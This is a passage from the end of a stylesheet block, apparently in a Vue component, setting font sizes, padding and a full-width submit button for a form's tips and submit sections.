          font-size: 12px;
        }
      }

      .tips {
        padding: 12px 0;
        font-size: 12px;
      }

      &__submit {
        margin-top: 66px;
        button {
          width: 100%;
          height: 35px;
          font-size: 12px;
        }
      }
    }
  }
}
</style>
